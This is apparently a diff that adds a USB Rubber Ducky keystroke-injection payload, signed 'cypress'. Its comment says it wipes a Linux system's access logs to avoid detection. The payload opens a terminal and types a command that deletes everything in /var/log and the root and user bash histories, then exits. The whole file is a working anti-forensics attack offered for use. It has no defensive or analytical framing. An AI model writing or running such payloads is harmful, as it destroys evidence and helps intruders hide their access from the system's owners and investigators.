@@ -1,0 +1,11 @@
+REM Wipes all logs of access on a linux system to avoid detection
+REM by: cypress
+ALT F2
+DELAY 1000
+STRING terminal
+DELAY 100
+ENTER
+DELAY 700
+STRING rm /var/log/* && rm /root/.bash_history && rm /home/$USER/.bash_history && exit
+DELAY 200
+ENTER
